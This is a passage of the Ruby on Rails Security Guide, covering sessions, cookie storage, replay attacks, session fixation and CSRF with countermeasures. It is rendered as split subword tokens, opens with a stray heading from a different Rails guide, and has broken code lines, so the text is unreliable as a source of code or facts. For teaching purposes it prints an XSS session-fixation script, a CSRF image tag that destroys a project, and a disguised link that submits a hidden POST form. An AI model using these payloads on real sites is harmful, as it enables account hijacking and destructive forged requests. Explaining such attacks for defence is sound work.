▁Configur ing ▁Rails ▁Application s < n > ============== ================ < n >
▁This ▁guide ▁cover s ▁the ▁configuration ▁and ▁initialization ▁features ▁available ▁to ▁Rails ▁applications .
▁After ▁reading ▁this ▁guide , ▁you ▁will ▁know :
▁Ruby ▁on ▁Rails ▁ Security ▁G u id e
▁ ============== ==============
▁This ▁m an u al ▁describe s ▁common ▁security ▁problem s ▁in ▁web ▁applications ▁and ▁how ▁to ▁avoid ▁them ▁with ▁Rails .
▁After ▁reading ▁this ▁guide , ▁you ▁will ▁know :
▁* ▁All ▁countermeasure s ▁ _ that ▁are ▁highlight ed _ .
▁* ▁The ▁ concept ▁of ▁sessions ▁in ▁Rails , ▁what ▁to ▁put ▁in ▁there ▁and ▁popular ▁attack ▁methods .
▁* ▁How ▁just ▁visit ing ▁a ▁site ▁can ▁be ▁a ▁security ▁problem ▁( with ▁CSRF ).
▁* ▁What ▁you ▁have ▁to ▁p a y ▁a tt ent ion ▁to ▁when ▁working ▁with ▁files ▁or ▁providing ▁an ▁administrati on ▁interface .
▁* ▁How ▁to ▁manage ▁users : ▁Logging ▁in ▁and ▁out ▁and ▁attack ▁methods ▁on ▁all ▁layer s .
▁* ▁And ▁the ▁most ▁popular ▁injection ▁attack ▁methods .
▁ ---------------- ---------------- ---------------- ---------------- ----------------
▁In tr o d u c t ion
▁ --- ---------
▁Web ▁application ▁frameworks ▁are ▁made ▁to ▁help ▁developers ▁build ▁web ▁applications .
▁Some ▁of ▁them ▁also ▁help ▁you ▁with ▁ sec ur ing ▁the ▁web ▁application .
▁In ▁fact ▁one ▁framework ▁is ▁not ▁more ▁secure ▁than ▁another : ▁If ▁you ▁use ▁it ▁correctly , ▁you ▁will ▁be ▁able ▁to ▁build ▁secure ▁app s ▁with ▁many ▁frameworks .
▁Ruby ▁on ▁Rails ▁has ▁some ▁cl ever ▁helper ▁methods , ▁for ▁example ▁again st ▁SQL ▁injection , ▁so ▁that ▁this ▁is ▁hard ly ▁a ▁problem . < n >< n >
▁In ▁general ▁there ▁is ▁no ▁such ▁thing ▁as ▁plug - n - play ▁security .
▁ Security ▁depend s ▁on ▁the ▁people ▁using ▁the ▁framework , ▁and ▁some times ▁on ▁the ▁development ▁method .
▁And ▁it ▁depend s ▁on ▁all ▁layer s ▁of ▁a ▁web ▁application ▁environment : ▁The ▁back - end ▁storage , ▁the ▁web ▁server ▁and ▁the ▁web ▁application ▁itself ▁( and ▁ possibl y ▁other ▁layer s ▁or ▁applications ).
▁The ▁G ar t n er ▁G r o up ▁however ▁ est i m ate s ▁that ▁7 5 % ▁of ▁attacks ▁are ▁at ▁the ▁web ▁application ▁layer , ▁and ▁found ▁out ▁" that ▁out ▁of ▁30 0 ▁a udi t ed ▁site s , ▁ 9 7 % ▁are ▁vulnerable ▁to ▁attack ".
▁This ▁is ▁because ▁web ▁applications ▁are ▁relative ly ▁easy ▁to ▁attack , ▁as ▁they ▁are ▁simple ▁to ▁understand ▁and ▁manipulate , ▁even ▁by ▁the ▁ la y ▁person .
▁The ▁thr e at s ▁again st ▁web ▁applications ▁include ▁user ▁account ▁ hijack ing , ▁bypass ▁of ▁access ▁control , ▁reading ▁or ▁modify ing ▁ sensitive ▁data , ▁or ▁present ing ▁f ra u d ul ent ▁content .
▁Or ▁an ▁attacker ▁m ight ▁be ▁able ▁to ▁install ▁a ▁T r o j an ▁h or se ▁program ▁or ▁un s ol ic it ed ▁e - mail ▁sending ▁software , ▁a i m ▁at ▁f in an cial ▁ en r ic h ment ▁or ▁cause ▁ br and ▁name ▁d am age ▁by ▁modify ing ▁company ▁resources .
▁In ▁order ▁to ▁prevent ▁attacks , ▁ mini m ize ▁their ▁i mpact ▁and ▁remove ▁point s ▁of ▁attack , ▁first ▁of ▁all , ▁you ▁have ▁to ▁fully ▁understand ▁the ▁attack ▁methods ▁in ▁order ▁to ▁find ▁the ▁correct ▁countermeasure s .
▁That ▁is ▁what ▁this ▁guide ▁a i m s ▁at .
▁In ▁order ▁to ▁develop ▁secure ▁web ▁applications ▁you ▁have ▁to ▁keep ▁up ▁to ▁date ▁on ▁all ▁layer s ▁and ▁know ▁your ▁ en em ies .
▁Add it ion al ▁Resource s
▁Sessions
▁-- ------
▁A ▁good ▁place ▁to ▁start ▁look ing ▁at ▁security ▁is ▁with ▁sessions , ▁which ▁can ▁be ▁vulnerable ▁to ▁particular ▁attacks .
▁### ▁What ▁are ▁Sessions ?
▁NOTE : ▁ _ HTTP ▁is ▁a ▁state less ▁protocol .
▁Sessions ▁make ▁it ▁state ful .
▁This ▁could ▁be ▁the ▁contents ▁of ▁a ▁sho p p ing ▁b as k et ▁or ▁the ▁user ▁id ▁of ▁the ▁current ly ▁logged ▁in ▁user .
▁With out ▁the ▁idea ▁of ▁sessions , ▁the ▁user ▁would ▁have ▁to ▁identify , ▁and ▁ probably ▁authenticate , ▁on ▁every ▁request .
▁Rails ▁will ▁create ▁a ▁new ▁session ▁automatically ▁if ▁a ▁new ▁user ▁access es ▁the ▁application .
▁It ▁will ▁load ▁an ▁existing ▁session ▁if ▁the ▁user ▁has ▁already ▁used ▁the ▁application .
▁A ▁session ▁usually ▁consist s ▁of ▁a ▁hash ▁of ▁values ▁and ▁a ▁session ▁id , ▁usually ▁a ▁3 2 - character ▁string , ▁to ▁identify ▁the ▁hash .
▁Every ▁cookie ▁sent ▁to ▁the ▁client ' s ▁browser ▁includes ▁the ▁session ▁id .
▁And ▁the ▁other ▁way ▁ r ound : ▁the ▁browser ▁will ▁send ▁it ▁to ▁the ▁server ▁on ▁every ▁request ▁from ▁the ▁client .
▁In ▁Rails ▁you ▁can ▁save ▁and ▁retrieve ▁values ▁using ▁the ▁session ▁method :
▁`` ` ruby
▁session [: user _ id ] ▁= ▁@ current _ user . id
▁User . find ( session [: user _ id ])
▁### ▁ Session ▁id
▁NOTE : ▁ _ The ▁session ▁id ▁is ▁a ▁3 2 ▁by t e ▁long ▁M D 5 ▁hash ▁value .
▁A ▁session ▁id ▁consist s ▁of ▁the ▁hash ▁value ▁of ▁a ▁random ▁string .
▁The ▁random ▁string ▁is ▁the ▁current ▁time , ▁a ▁random ▁number ▁between ▁0 ▁and ▁1, ▁the ▁process ▁id ▁number ▁of ▁the ▁Ruby ▁interpret er ▁( also ▁basic ally ▁a ▁random ▁number ) ▁and ▁a ▁constant ▁string .
▁Currently ▁it ▁is ▁not ▁f e as i b le ▁to ▁ br ute - force ▁Rails ' ▁session ▁id s .
▁To ▁date ▁M D 5 ▁is ▁un com promised , ▁but ▁there ▁have ▁been ▁co ll is ion s , ▁so ▁it ▁is ▁the or e tic ally ▁possible ▁to ▁create ▁another ▁input ▁text ▁with ▁the ▁same ▁hash ▁value .
▁But ▁this ▁has ▁ha d ▁no ▁security ▁i mpact ▁to ▁date .
▁### ▁ Session ▁H i j ac k ing
▁WARNING : ▁ _ S t e al ing ▁a ▁user ' s ▁session ▁id ▁let s ▁an ▁attacker ▁use ▁the ▁web ▁application ▁in ▁the ▁victim ' s ▁name .
▁M any ▁web ▁applications ▁have ▁an ▁authentication ▁system : ▁a ▁user ▁provides ▁a ▁user ▁name ▁and ▁password , ▁the ▁web ▁application ▁check s ▁them ▁and ▁store s ▁the ▁corresponding ▁user ▁id ▁in ▁the ▁session ▁hash .
▁ From ▁now ▁on , ▁the ▁session ▁is ▁valid .
▁On ▁every ▁request ▁the ▁application ▁will ▁load ▁the ▁user , ▁identifie d ▁by ▁the ▁user ▁id ▁in ▁the ▁session , ▁without ▁the ▁need ▁for ▁new ▁authentication .
▁The ▁session ▁id ▁in ▁the ▁cookie ▁identifie s ▁the ▁session .
▁H ence , ▁the ▁cookie ▁serve s ▁as ▁temporary ▁authentication ▁for ▁the ▁web ▁application .
▁Any one ▁who ▁ se ize s ▁a ▁cookie ▁from ▁some one ▁else , ▁may ▁use ▁the ▁web ▁application ▁as ▁this ▁user ▁- ▁with ▁ possibl y ▁sever e ▁con sequence s .
▁Here ▁are ▁some ▁ways ▁to ▁ hijack ▁a ▁session , ▁and ▁their ▁countermeasure s :
▁* ▁S n if f ▁the ▁cookie ▁in ▁an ▁in secure ▁network .
▁A ▁ w i re less ▁L A N ▁can ▁be ▁an ▁example ▁of ▁such ▁a ▁network .
▁In ▁an ▁un encrypted ▁ w i re less ▁L A N ▁it ▁is ▁es pecially ▁easy ▁to ▁list en ▁to ▁the ▁traffic ▁of ▁all ▁connect ed ▁clients .
▁For ▁the ▁web ▁application ▁ builder ▁this ▁means ▁to ▁ _ provide ▁a ▁secure ▁connection ▁over ▁SSL _ .
▁In ▁Rails ▁3.1 ▁and ▁later , ▁this ▁could ▁be ▁accomplish ed ▁by ▁always ▁for c ing ▁SSL ▁connection ▁in ▁your ▁application ▁config ▁file :
▁`` ` ruby
▁config . force _ ssl ▁= ▁true
▁`` `
▁* ▁ Most ▁people ▁don ' t ▁clear ▁out ▁the ▁cookies ▁after ▁working ▁at ▁a ▁public ▁terminal .
▁So ▁if ▁the ▁last ▁user ▁did n ' t ▁log ▁out ▁of ▁a ▁web ▁application , ▁you ▁would ▁be ▁able ▁to ▁use ▁it ▁as ▁this ▁user .
▁Provide ▁the ▁user ▁with ▁a ▁ _ log - out ▁button _ ▁in ▁the ▁web ▁application , ▁and ▁ _ make ▁it ▁pro m in ent _ .
▁* ▁M any ▁c ross - site ▁ script ing ▁( X SS ) ▁ exploit s ▁a i m ▁at ▁obtain ing ▁the ▁user ' s ▁cookie .
▁* ▁Instead ▁of ▁steal ing ▁a ▁cookie ▁ unknown ▁to ▁the ▁attacker , ▁they ▁fix ▁a ▁user ' s ▁session ▁identifier ▁( in ▁the ▁cookie ) ▁known ▁to ▁them .
▁Read ▁more ▁about ▁this ▁so - called ▁session ▁fix ation ▁later .
▁The ▁main ▁object ive ▁of ▁most ▁attacker s ▁is ▁to ▁make ▁m one y .
▁The ▁under ground ▁ price s ▁for ▁stolen ▁b an k ▁login ▁account s ▁range ▁from ▁ $ 10 - $ 1 000 ▁( de pending ▁on ▁the ▁available ▁amount ▁of ▁f un d s ), ▁ $ 0 . 4 0 - $ 20 ▁for ▁c r edit ▁ card ▁number s , ▁ $ 1 - $ 8 ▁for ▁online ▁a u c t ion ▁site ▁account s ▁and ▁ $ 4 - $ 3 0 ▁for ▁email ▁passwords , ▁according ▁to ▁the ▁[ S ymantec ▁G lo b al ▁ Internet ▁ Security ▁T h re at ▁Re port ]( http :// eval . s ymantec . com / m k t g info / e nterprise / white _ paper s / b - white paper _ in ter net _ security _ th re at _ re port _ x i i i _ 04 - 200 8 . en - us . p d f ).
▁### ▁ Session ▁G u id e line s
▁Here ▁are ▁some ▁general ▁guide line s ▁on ▁sessions .
▁* ▁ _ Do ▁not ▁store ▁large ▁objects ▁in ▁a ▁session _ .
▁Instead ▁you ▁should ▁store ▁them ▁in ▁the ▁database ▁and ▁save ▁their ▁id ▁in ▁the ▁session .
▁This ▁will ▁eliminate ▁ s y n ch r on i z ation ▁ head a ch es ▁and ▁it ▁won ' t ▁fill ▁up ▁your ▁session ▁storage ▁ space ▁( de pending ▁on ▁what ▁session ▁storage ▁you ▁chose , ▁see ▁below ).
▁This ▁will ▁also ▁be ▁a ▁good ▁idea , ▁if ▁you ▁modify ▁the ▁structure ▁of ▁an ▁object ▁and ▁old ▁versions ▁of ▁it ▁are ▁ still ▁in ▁some ▁user ' s ▁cookies .
▁With ▁server - side ▁session ▁storage s ▁you ▁can ▁clear ▁out ▁the ▁sessions , ▁but ▁with ▁client - side ▁storage s , ▁this ▁is ▁hard ▁to ▁m it ig ate .
▁* ▁ _ C r it ical ▁data ▁should ▁not ▁be ▁store d ▁in ▁session _ .
▁If ▁the ▁user ▁clear s ▁their ▁cookies ▁or ▁close s ▁the ▁browser , ▁they ▁will ▁be ▁lost .
▁And ▁with ▁a ▁client - side ▁session ▁storage , ▁the ▁user ▁can ▁read ▁the ▁data .
▁### ▁ Session ▁S to r age
▁NOTE : ▁ _ Rails ▁provides ▁sever al ▁storage ▁ mechanism s ▁for ▁the ▁session ▁hashes .
▁The ▁most ▁important ▁is ▁` ActionDispatch :: Session :: CookieStore `.
▁Rails ▁2 ▁introduce d ▁a ▁new ▁default ▁session ▁storage , ▁ CookieStore .
▁ CookieStore ▁save s ▁the ▁session ▁hash ▁directly ▁in ▁a ▁cookie ▁on ▁the ▁client - side .
▁The ▁server ▁retrieve s ▁the ▁session ▁hash ▁from ▁the ▁cookie ▁and ▁eliminate s ▁the ▁need ▁for ▁a ▁session ▁id .
▁That ▁will ▁great ly ▁increase ▁the ▁speed ▁of ▁the ▁application , ▁but ▁it ▁is ▁a ▁con tr over s i al ▁storage ▁option ▁and ▁you ▁have ▁to ▁think ▁about ▁the ▁security ▁implications ▁of ▁it :
▁* ▁Co o k ies ▁i mp ly ▁a ▁ str ic t ▁size ▁limit ▁of ▁4 k B . ▁This ▁is ▁fine ▁as ▁you ▁should ▁not ▁store ▁large ▁amount s ▁of ▁data ▁in ▁a ▁session ▁any way , ▁as ▁describe d ▁before .
▁ _ S to r ing ▁the ▁current ▁user ' s ▁database ▁id ▁in ▁a ▁session ▁is ▁usually ▁ o k _ .
▁* ▁The ▁client ▁can ▁see ▁everything ▁you ▁store ▁in ▁a ▁session , ▁because ▁it ▁is ▁store d ▁in ▁clear - text ▁( actual ly ▁ Base 64 - en code d , ▁so ▁not ▁encrypted ).
▁So , ▁of ▁course , ▁ _ you ▁don ' t ▁want ▁to ▁store ▁any ▁secret s ▁here _ .
▁To ▁prevent ▁session ▁hash ▁tamper ing , ▁a ▁digest ▁is ▁calculat ed ▁from ▁the ▁session ▁with ▁a ▁server - side ▁secret ▁and ▁inserted ▁into ▁the ▁end ▁of ▁the ▁cookie .
▁That ▁means ▁the ▁security ▁of ▁this ▁storage ▁depend s ▁on ▁this ▁secret ▁( and ▁on ▁the ▁digest ▁algorithm , ▁which ▁defaults ▁to ▁S H A 1, ▁for ▁ compatibility ).
▁So ▁ _ do n ' t ▁use ▁a ▁tr i via l ▁secret , ▁i . e . ▁a ▁word ▁from ▁a ▁d ic t ion ary , ▁or ▁one ▁which ▁is ▁short er ▁than ▁30 ▁characters _ .
▁` secret s . secret _ key _ base ` ▁is ▁used ▁for ▁specify ing ▁a ▁key ▁which ▁allows ▁sessions ▁for ▁the ▁application ▁to ▁be ▁verifie d ▁again st ▁a ▁known ▁secure ▁key ▁to ▁prevent ▁tamper ing .
▁Application s ▁get ▁` secret s . secret _ key _ base ` ▁initialize d ▁to ▁a ▁random ▁key ▁present ▁in ▁` config / secret s . yml `, ▁e . g . :
▁development :
▁secret _ key _ base : ▁a 7 5 d . . .
▁test :
▁secret _ key _ base : ▁4 9 2 f . . .
▁production :
▁secret _ key _ base : ▁<%= ▁ ENV [ " S E C RE T _ K E Y _ BASE "] ▁%>
▁O l d er ▁versions ▁of ▁Rails ▁use ▁ CookieStore , ▁which ▁uses ▁` secret _ token ` ▁instead ▁of ▁` secret _ key _ base ` ▁that ▁is ▁used ▁by ▁E n crypt ed CookieStore .
▁Read ▁the ▁upgrade ▁documentation ▁for ▁more ▁information .
▁If ▁you ▁have ▁receive d ▁an ▁application ▁where ▁the ▁secret ▁was ▁expose d ▁( e . g . ▁an ▁application ▁who se ▁source ▁was ▁ shared ), ▁ strong ly ▁consider ▁changing ▁the ▁secret .
▁### ▁Re play ▁A tt ac k s ▁for ▁ CookieStore ▁Sessions
▁TIP : ▁ _ A nother ▁sort ▁of ▁attack ▁you ▁have ▁to ▁be ▁a w a re ▁of ▁when ▁using ▁` CookieStore ` ▁is ▁the ▁re play ▁attack .
▁It ▁works ▁like ▁this :
▁* ▁A ▁user ▁receive s ▁c r edit s , ▁the ▁amount ▁is ▁store d ▁in ▁a ▁session ▁( which ▁is ▁a ▁ bad ▁idea ▁any way , ▁but ▁we ' ll ▁do ▁this ▁for ▁ demo n str ation ▁purposes ).
▁* ▁The ▁user ▁b u y s ▁something .
▁ Includ ing ▁a ▁non ce ▁( a ▁random ▁value ) ▁in ▁the ▁session ▁solve s ▁re play ▁attacks .
▁A ▁non ce ▁is ▁valid ▁only ▁once , ▁and ▁the ▁server ▁has ▁to ▁keep ▁track ▁of ▁all ▁the ▁valid ▁non ce s .
▁It ▁get s ▁even ▁more ▁complicated ▁if ▁you ▁have ▁sever al ▁application ▁server s ▁( mong rel s ).
▁S to r ing ▁non ce s ▁in ▁a ▁database ▁table ▁would ▁def e at ▁the ▁entire ▁purpose ▁of ▁ CookieStore ▁( a v o id ing ▁access ing ▁the ▁database ).
▁The ▁best ▁ _ s ol u t ion ▁again st ▁it ▁is ▁not ▁to ▁store ▁this ▁kind ▁of ▁data ▁in ▁a ▁session , ▁but ▁in ▁the ▁database _ .
▁In ▁this ▁case ▁store ▁the ▁c r edit ▁in ▁the ▁database ▁and ▁the ▁logged _ in _ user _ id ▁in ▁the ▁session .
▁### ▁ Session ▁Fix ation
▁NOTE : ▁ _ A part ▁from ▁steal ing ▁a ▁user ' s ▁session ▁id , ▁the ▁attacker ▁may ▁fix ▁a ▁session ▁id ▁known ▁to ▁them .
▁This ▁is ▁called ▁session ▁fix ation .
▁ Session ▁fix ation ]( images / session _ fi x ation . png )
▁This ▁attack ▁focus es ▁on ▁fix ing ▁a ▁user ' s ▁session ▁id ▁known ▁to ▁the ▁attacker , ▁and ▁for c ing ▁the ▁user ' s ▁browser ▁into ▁using ▁this ▁id .
▁It ▁is ▁therefore ▁not ▁necessary ▁for ▁the ▁attacker ▁to ▁steal ▁the ▁session ▁id ▁after w ar d s .
▁Here ▁is ▁how ▁this ▁attack ▁works :
▁* ▁The ▁attacker ▁creates ▁a ▁valid ▁session ▁id : ▁They ▁load ▁the ▁login ▁page ▁of ▁the ▁web ▁application ▁where ▁they ▁want ▁to ▁fix ▁the ▁session , ▁and ▁take ▁the ▁session ▁id ▁in ▁the ▁cookie ▁from ▁the ▁response ▁( see ▁number ▁1 ▁and ▁2 ▁in ▁the ▁image ).
▁As ▁you ▁may ▁not ▁change ▁a ▁cookie ▁of ▁another ▁domain ▁( because ▁of ▁the ▁same ▁ origin ▁policy ), ▁the ▁attacker ▁has ▁to ▁run ▁a ▁JavaScript ▁from ▁the ▁domain ▁of ▁the ▁target ▁web ▁application .
▁In j ec ting ▁the ▁JavaScript ▁code ▁into ▁the ▁application ▁by ▁ X SS ▁accomplish es ▁this ▁attack .
▁Here ▁is ▁an ▁example : ▁` < script > document . cookie =" _ session _ id = 16 d 5 b 78 a b b 28 e 3 d 6 2 06 b 60 f 22 a 0 3 c 8 d 9 " ; </ script >` .
▁Read ▁more ▁about ▁ X SS ▁and ▁injection ▁later ▁on .
▁* ▁The ▁attacker ▁ l ure s ▁the ▁victim ▁to ▁the ▁in f ec t ed ▁page ▁with ▁the ▁JavaScript ▁code .
▁By ▁view ing ▁the ▁page , ▁the ▁victim ' s ▁browser ▁will ▁change ▁the ▁session ▁id ▁to ▁the ▁tr ap ▁session ▁id .
▁* ▁As ▁the ▁new ▁tr ap ▁session ▁is ▁un us ed , ▁the ▁web ▁application ▁will ▁require ▁the ▁user ▁to ▁authenticate .
▁* ▁ From ▁now ▁on , ▁the ▁victim ▁and ▁the ▁attacker ▁will ▁co - use ▁the ▁web ▁application ▁with ▁the ▁same ▁session : ▁The ▁session ▁be ca me ▁valid ▁and ▁the ▁victim ▁did n ' t ▁notice ▁the ▁attack .
▁### ▁ Session ▁Fix ation ▁- ▁C ountermeasures
▁TIP : ▁ _ O n e ▁line ▁of ▁code ▁will ▁protect ▁you ▁from ▁session ▁fix ation .
▁The ▁most ▁effective ▁countermeasure ▁is ▁to ▁ _ issue ▁a ▁new ▁session ▁identifier _ ▁and ▁declare ▁the ▁old ▁one ▁invalid ▁after ▁a ▁successful ▁login .
▁That ▁way , ▁an ▁attacker ▁cannot ▁use ▁the ▁ fixed ▁session ▁identifier .
▁This ▁is ▁a ▁good ▁countermeasure ▁again st ▁session ▁ hijack ing , ▁as ▁well .
▁Here ▁is ▁how ▁to ▁create ▁a ▁new ▁session ▁in ▁Rails :
▁reset _ session
▁If ▁you ▁use ▁the ▁popular ▁Re st ful Authentication ▁plugin ▁for ▁user ▁manage ment , ▁add ▁reset _ session ▁to ▁the ▁Sessions Controller # create ▁action .
▁Note ▁that ▁this ▁remove s ▁any ▁value ▁from ▁the ▁session , ▁ _ you ▁have ▁to ▁transfer ▁them ▁to ▁the ▁new ▁session _ .
▁A nother ▁countermeasure ▁is ▁to ▁ _ save ▁user - specific ▁ properties ▁in ▁the ▁session _ , ▁verify ▁them ▁every ▁time ▁a ▁request ▁comes ▁in , ▁and ▁d en y ▁access , ▁if ▁the ▁information ▁does ▁not ▁match .
▁Such ▁ properties ▁could ▁be ▁the ▁remote ▁ IP ▁address ▁or ▁the ▁user ▁a g ent ▁( the ▁web ▁browser ▁name ), ▁though ▁the ▁latter ▁is ▁less ▁user - specific .
▁When ▁saving ▁the ▁ IP ▁address , ▁you ▁have ▁to ▁be ar ▁in ▁mind ▁that ▁there ▁are ▁ Internet ▁ service ▁provide r s ▁or ▁large ▁ org an i z ation s ▁that ▁put ▁their ▁users ▁be h in d ▁pro x ies .
▁ _ The se ▁m ight ▁change ▁over ▁the ▁course ▁of ▁a ▁session _ , ▁so ▁these ▁users ▁will ▁not ▁be ▁able ▁to ▁use ▁your ▁application , ▁or ▁only ▁in ▁a ▁ limited ▁way .
▁### ▁ Session ▁Exp ir y
▁NOTE : ▁ _ Session s ▁that ▁ never ▁expire ▁extend ▁the ▁time - frame ▁for ▁attacks ▁such ▁as ▁c ross - site ▁request ▁ forgery ▁( CSRF ), ▁session ▁ hijack ing ▁and ▁session ▁fix ation .
▁One ▁possibility ▁is ▁to ▁set ▁the ▁ ex p ir y ▁time - st am p ▁of ▁the ▁cookie ▁with ▁the ▁session ▁id .
▁However ▁the ▁client ▁can ▁edit ▁cookies ▁that ▁are ▁store d ▁in ▁the ▁web ▁browser ▁so ▁ ex p ir ing ▁sessions ▁on ▁the ▁server ▁is ▁safe r .
▁Here ▁is ▁an ▁example ▁of ▁how ▁to ▁ _ expire ▁sessions ▁in ▁a ▁database ▁table _ .
▁Call ▁` Session . s w eep (" 20 ▁minutes ") ` ▁to ▁expire ▁sessions ▁that ▁were ▁used ▁longer ▁than ▁20 ▁minutes ▁ ago .
▁class ▁ Session ▁< ▁ActiveRecord :: Base
▁def ▁self . s w eep ( time ▁= ▁1. hour )
▁if ▁time . is _ a ?(
▁time ▁= ▁time . split . in j ec t ▁ { ▁| count , ▁ unit | ▁count . to _ i . s end ( unit ) ▁ }
▁end
▁delete _ all ▁" updated _ at ▁< ▁' # { time . ago . to _ s (: db )} ' "
▁end
▁The ▁section ▁about ▁session ▁fix ation ▁introduce d ▁the ▁problem ▁of ▁maintain ed ▁sessions .
▁An ▁attacker ▁maintain ing ▁a ▁session ▁every ▁f ive ▁minutes ▁can ▁keep ▁the ▁session ▁ al ive ▁for ever , ▁although ▁you ▁are ▁ ex p ir ing ▁sessions .
▁A ▁simple ▁solution ▁for ▁this ▁would ▁be ▁to ▁add ▁a ▁created _ at ▁column ▁to ▁the ▁sessions ▁table .
▁Now ▁you ▁can ▁delete ▁sessions ▁that ▁were ▁created ▁a ▁long ▁time ▁ ago .
▁Use ▁this ▁line ▁in ▁the ▁ s w eep ▁method ▁above :
▁delete _ all ▁" updated _ at ▁< ▁' # { time . ago . to _ s (: db )} ' ▁OR
▁created _ at ▁< ▁' # { 2 . day s . ago . to _ s (: db )} ' "
▁C ross - Site ▁ Request ▁For ge ry ▁( CSRF )
▁- ---------------- ----------------
▁This ▁attack ▁method ▁works ▁by ▁including ▁ malicious ▁code ▁or ▁a ▁link ▁in ▁a ▁page ▁that ▁access es ▁a ▁web ▁application ▁that ▁the ▁user ▁is ▁believe d ▁to ▁have ▁ authenticated .
▁If ▁the ▁session ▁for ▁that ▁web ▁application ▁has ▁not ▁time d ▁out , ▁an ▁attacker ▁may ▁execute ▁un authorize d ▁commands .
▁E i the r ▁they ▁store ▁the ▁session ▁id ▁in ▁the ▁cookie ▁and ▁have ▁a ▁server - side ▁session ▁hash , ▁or ▁the ▁entire ▁session ▁hash ▁is ▁on ▁the ▁client - side .
▁In ▁either ▁case ▁the ▁browser ▁will ▁automatically ▁send ▁along ▁the ▁cookie ▁on ▁every ▁request ▁to ▁a ▁domain , ▁if ▁it ▁can ▁find ▁a ▁cookie ▁for ▁that ▁domain .
▁The ▁con tr over s i al ▁point ▁is , ▁that ▁it ▁will ▁also ▁send ▁the ▁cookie , ▁if ▁the ▁request ▁comes ▁from ▁a ▁site ▁of ▁a ▁different ▁domain .
▁Let ' s ▁start ▁with ▁an ▁example :
▁* ▁Bo b ▁b row s es ▁a ▁message ▁ board ▁and ▁views ▁a ▁post ▁from ▁a ▁ha c k er ▁where ▁there ▁is ▁a ▁ craft ed ▁HTML ▁image ▁element .
▁The ▁element ▁reference s ▁a ▁command ▁in ▁Bo b ' s ▁project ▁manage ment ▁application , ▁rather ▁than ▁an ▁image ▁file .
▁* ▁` < img ▁src =" http :// www . web app . com / project /1/ destroy "> `
▁* ▁Bo b ' s ▁session ▁at ▁ www . web app . com ▁is ▁ still ▁ al ive , ▁because ▁he ▁did n ' t ▁log ▁out ▁a ▁few ▁minutes ▁ ago .
▁* ▁By ▁view ing ▁the ▁post , ▁the ▁browser ▁find s ▁an ▁image ▁tag .
▁It ▁ tries ▁to ▁load ▁the ▁suspect ed ▁image ▁from ▁ www . web app . com .
▁As ▁explained ▁before , ▁it ▁will ▁also ▁send ▁along ▁the ▁cookie ▁with ▁the ▁valid ▁session ▁id .
▁* ▁The ▁web ▁application ▁at ▁ www . web app . com ▁verifie s ▁the ▁user ▁information ▁in ▁the ▁corresponding ▁session ▁hash ▁and ▁destroy s ▁the ▁project ▁with ▁the ▁ ID ▁1.
▁It ▁the n ▁returns ▁a ▁result ▁page ▁which ▁is ▁an ▁un expected ▁result ▁for ▁the ▁browser , ▁so ▁it ▁will ▁not ▁display ▁the ▁image .
▁* ▁Bo b ▁does n ' t ▁notice ▁the ▁attack ▁- ▁but ▁a ▁few ▁days ▁later ▁he ▁find s ▁out ▁that ▁project ▁number ▁one ▁is ▁g one .
▁It ▁is ▁important ▁to ▁notice ▁that ▁the ▁actual ▁ craft ed ▁image ▁or ▁link ▁does n ' t ▁necessar ily ▁have ▁to ▁be ▁ s it u at ed ▁in ▁the ▁web ▁application ' s ▁domain , ▁it ▁can ▁be ▁any where ▁- ▁in ▁a ▁for um , ▁blog ▁post ▁or ▁email .
▁CSRF ▁appears ▁very ▁rare ly ▁in ▁C V E ▁( Co m m on ▁ V ul n er a b il it ies ▁and ▁Exp o s ure s ) ▁- ▁less ▁than ▁0 . 1 % ▁in ▁200 6 ▁- ▁but ▁it ▁really ▁is ▁a ▁' s l eep ing ▁g i ant ' ▁[ G ross ma n ] .
▁### ▁CSRF ▁C ountermeasures
▁NOTE : ▁ _ First , ▁as ▁is ▁required ▁by ▁the ▁W 3 C , ▁use ▁GET ▁and ▁POST ▁appropriate ly .
▁S ec on d ly , ▁a ▁security ▁token ▁in ▁non - GET ▁requests ▁will ▁protect ▁your ▁application ▁from ▁CSRF . _
▁The ▁HTTP ▁protocol ▁basic ally ▁provides ▁two ▁main ▁types ▁of ▁requests ▁- ▁GET ▁and ▁POST ▁( and ▁more , ▁but ▁they ▁are ▁not ▁supported ▁by ▁most ▁browsers ).
▁The ▁World ▁Wi de ▁Web ▁Co n s or t i um ▁( W 3 C ) ▁provides ▁a ▁check list ▁for ▁ ch oo s ing ▁HTTP ▁GET ▁or ▁POST :
▁** U se ▁GET ▁if : **
▁* ▁The ▁interact ion ▁is ▁more ▁ _ like ▁a ▁question _ ▁( i . e . , ▁it ▁is ▁a ▁safe ▁operation ▁such ▁as ▁a ▁query , ▁read ▁operation , ▁or ▁look up ).
▁** U se ▁POST ▁if : **
▁* ▁The ▁interact ion ▁is ▁more ▁ _ like ▁an ▁order _ , ▁or
▁* ▁The ▁interact ion ▁ _ change s ▁the ▁state _ ▁of ▁the ▁resource ▁in ▁a ▁way ▁that ▁the ▁user ▁would ▁per ce ive ▁( e . g . , ▁a ▁sub script ion ▁to ▁a ▁ service ), ▁or
▁* ▁The ▁user ▁is ▁ _ hel d ▁account able ▁for ▁the ▁results _ ▁of ▁the ▁interact ion .
▁If ▁your ▁web ▁application ▁is ▁RESTful , ▁you ▁m ight ▁be ▁used ▁to ▁ additional ▁HTTP ▁verb s , ▁such ▁as ▁ PATCH , ▁ PUT ▁or ▁DELETE .
▁ Most ▁of ▁to day ' s ▁web ▁browsers , ▁however ▁do ▁not ▁support ▁them ▁- ▁only ▁GET ▁and ▁POST .
▁Rails ▁uses ▁a ▁hidden ▁` _ method ` ▁field ▁to ▁handle ▁this ▁bar r i er .
▁ _ POST ▁requests ▁can ▁be ▁sent ▁automatically , ▁too _ .
▁Here ▁is ▁an ▁example ▁for ▁a ▁link ▁which ▁display s ▁ www . ha rm less . com ▁as ▁d est in ation ▁in ▁the ▁browser ' s ▁status ▁bar .
▁In ▁fact ▁it ▁dynamic ally ▁creates ▁a ▁new ▁form ▁that ▁send s ▁a ▁POST ▁request .
▁`` ` html
▁< a ▁ href =" http :// www . ha rm less . com / " ▁on click ="
▁var ▁f ▁= ▁document . create E le ment (' form ') ;
▁f . style . display ▁= ▁' n one ' ;
▁this . parent N ode . app end C h il d ( f ) ;
▁f . method ▁= ▁' POST ' ;
▁f . action ▁= ▁' http :// www . example . com / account / destroy ' ;
▁f . submit ( ) ;
▁return ▁false ; "> To ▁the ▁harm less ▁ s ur ve y </ a >
▁Or ▁the ▁attacker ▁place s ▁the ▁code ▁into ▁the ▁on m ous e over ▁even t ▁handle r ▁of ▁an ▁image :
